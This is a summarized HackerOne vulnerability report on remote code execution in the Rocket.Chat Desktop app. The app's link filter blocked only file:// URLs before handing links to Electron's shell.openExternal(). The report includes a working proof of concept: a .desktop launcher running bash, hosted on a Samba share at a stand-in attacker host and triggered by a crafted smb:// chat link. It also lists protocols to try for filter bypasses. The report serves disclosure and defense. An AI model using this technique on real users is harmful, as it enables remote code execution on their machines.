# Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE

## Metadata
- **Source:** HackerOne
- **Report:** 924151 | https://hackerone.com/reports/924151
- **Submitted:** 2020-07-15
- **Reporter:** baltpeter
- **Program:** Rocket.Chat
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote Code Execution, Improper Input Validation, Insecure Protocol Handling, Privilege Escalation
- **CVEs:** None
- **Category:** memory-binary

## Summary
Rocket.Chat Desktop application uses an insufficient blocklist approach to filter URLs passed to Electron's shell.openExternal() function, allowing attackers to craft malicious links using alternative protocols (e.g., smb://) that bypass the file:// filter. An attacker can send a link in a shared channel that, when clicked by a user, executes arbitrary code with the user's privileges.

## Attack scenario
1. Attacker sets up a public Samba server with a malicious .desktop file (or equivalent executable)
2. Attacker sends a crafted smb:// link in a shared Rocket.Chat channel
3. Victim receives the message and clicks on the link
4. The link bypasses the insufficient file:// blocklist filter and is passed to shell.openExternal()
5. The operating system interprets the smb:// protocol and downloads the malicious executable
6. Victim confirms execution (or execution occurs automatically depending on OS configuration), resulting in arbitrary code execution with victim's privileges

## Root cause
The application uses a blocklist-based approach filtering only file:// protocol while passing all other URLs directly to shell.openExternal(). This fails to account for alternative protocols (smb://, gopher://, etc.) that can be leveraged to execute code. The Electron documentation explicitly warns against passing untrusted content to this function.

## Attacker mindset
The attacker recognizes that legitimate chat applications must handle links but exploits the developer's assumption that blocking only file:// URLs is sufficient. By using alternative protocols available on target systems, they bypass the weak filter. The attack requires minimal technical sophistication once the vulnerability is identified and can scale automatically through group messaging.

## Defensive takeaways
- Implement allowlist-based URL validation instead of blocklist approaches for security-critical functions
- Only allow safe protocols: http://, https://, and mailto:// for external link handling
- Never pass user-controlled or untrusted content to shell.openExternal() without strict validation
- Follow framework-specific security guidance (Electron explicitly warns against this pattern)
- Consider disabling automatic protocol handlers or requiring explicit user approval per protocol
- Regularly audit usage of dangerous APIs that interact with OS-level functions
- Test security controls against multiple protocol types, not just file://

## Variant hunting
Test other protocol handlers: gopher://, news://, nntp://, telnet://, ldap://, jar://, data://, vbscript://, javascript://
Check if custom protocol handlers can be registered by the application or malicious actors
Investigate if URL encoding or double encoding can bypass the filter
Test Windows-specific protocols like ms-msdt:, vscode://, or winrar://
Examine macOS-specific schemes and handlers
Look for similar patterns in other Electron-based applications
Check if the application sanitizes URLs in any other code paths differently

## MITRE ATT&CK
- T1190
- T1204.001
- T1566.002
- T1566.003
- T1559.001
- T1203

## Notes
This vulnerability demonstrates a classic security flaw: relying on blocklists for privilege-sensitive operations. The fix is straightforward (implement allowlist), making this a high-impact security issue with low remediation complexity. The vulnerability requires user interaction (clicking the link) but can be delivered at scale through group chat. Different payloads enable exploitation across Windows, macOS, and Linux. The report was well-researched with proof-of-concept demonstration and included Electron documentation references warning against exactly this pattern.

## Full report
<details><summary>Expand</summary>

**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.

**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.

## Releases Affected:

  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases
  * Tested with latest commit `4c06582` on the `develop` branch from https://github.com/RocketChat/Rocket.Chat.Electron

## Steps To Reproduce (from initial installation to vulnerability):

  1. Install Rocket.Chat Desktop on Xubuntu 20.04.
  2. Login and join a channel.
  3. Setup a public Samba server (at `attacker.tld` in this example) and create a public share (named `public` here). In this share, publish the following file as `pwn.desktop` and make it executable:
     
     ```ini
    [Desktop Entry]
    Exec=bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
    Type=Application
     ```
  4. From another account in the same channel, send the following message with the corresponding values replaced: `smb://attacker.tld/public/pwn.desktop`
  5. Click the link and (if necessary) confirm starting the untrusted launcher.
  6. Notice the calculator and message box appearing, confirming remote code execution.

## Supporting Material/References:

  * I have attached a video of the attack to the report.

## Suggested mitigation

  * The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24
  * The filter only acts as a blocklist, filtering out `file://` links. There are however plenty of other protocols depending on the system, like `smb://` as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing `http://`, `https://` and `mailto:` will be enough but you may have different requirements.

Best Regards,  
Benjamin Altpeter  
Technical University of Braunschweig, Germany

## Impact

* The attack can be triggered remotely by an attacker by simply sending a message to a channel.
  * The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.
  * This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux `.desktop` file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using `shell.openExternal()` with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content
  * If the attack is executed successfully, the attacker can run arbitrary code on the user's system.
  * Patching the problem is simple and doesn't break any legitimate use cases that I can think of.

</details>

---
*Analysed by Claude on 2026-05-12*
